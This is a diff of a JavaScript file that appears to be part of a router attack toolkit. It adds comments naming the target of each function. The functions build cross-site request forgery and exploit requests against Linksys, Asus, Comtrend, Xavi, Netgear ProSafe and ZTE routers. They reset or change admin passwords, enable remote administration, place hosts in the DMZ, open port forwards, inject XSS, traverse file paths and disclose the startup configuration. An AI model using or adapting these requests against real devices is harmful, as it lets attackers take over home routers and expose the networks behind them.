@@ -2013,6 +2013,7 @@ function ea2700xssr() {
 	}
 }
 
+// Linksys WRT310Nv2 Cross site scripting
 function CSRFxssPWN() {
 	ip=prompt("IP:");
 	xss=prompt("XSS:");
@@ -2023,6 +2024,7 @@ function CSRFxssPWN() {
 	}
 }
 
+// Linksys EA2700 File Path Traversal apply.cgi
 function ea2700pathr() {
 	ip=prompt("IP:");
 	xss=prompt("FILE:");
@@ -2033,7 +2035,7 @@ function ea2700pathr() {
 	}
 }
 
-
+// Asus RT-N56U RT-AC66U reset admin password enable remote http csrf
 function N56Ur() {
 	ip=prompt("IP:");
 	document.N56U.action="http://"+ip+"/start_apply.htm";
@@ -2042,13 +2044,13 @@ function N56Ur() {
 	}
 }
 
+// Comtrend CT-5624 Change admin password, CT-5624 Change passwords
 function ncomtrendpass() {
 	pass=prompt("New password:");
 	if (pass==null || pass==""){}else{
 		document.location="http://192.168.1.1/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
 	}
 }
-
 function ncomtrendpassr() {
 	ip=prompt("IP:");
 	pass=prompt("New password:");
@@ -2057,13 +2059,13 @@ function ncomtrendpassr() {
 	}
 }
 
+// Comtrend CT-53XX CT-5071 CT-56XX Put a local IP in DMZ
 function comtrendip() {
 	ip=prompt("Local IP to put in DMZ:");
 	if (ip==null || ip==""){}else{
 		document.location="http://192.168.1.1/scdmz.cmd?address="+ip;
 	}
 }
-
 function comtrendipr() {
 	ipp=prompt("Router IP:");
 	ip=prompt("Local IP to put in DMZ:");
@@ -2072,6 +2074,7 @@ function comtrendipr() {
 	}
 }
 
+// Xavi X7968 open port for ip CSRF
 function xavi() {
 	nombre=prompt("Name of the rule:");
 	ip=prompt("Allow IP:");
@@ -2080,7 +2083,6 @@ function xavi() {
 		document.location="http://192.168.1.1/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
 	}
 }
-
 function xavir() {
 	ipp=prompt("Target IP:");
 	nombre=prompt("Name of the rule:");
@@ -2098,6 +2100,7 @@ function prosafe_configdisclosure(ip)
     document.location="http://"+ip+"/filesystem/startup-config";
 }
 
+// ZTE WXV10 W300 - Change Admin Password
 function wxv10w300_changeadmin(ip)
 {
 	ip = ip || "192.168.1.1";
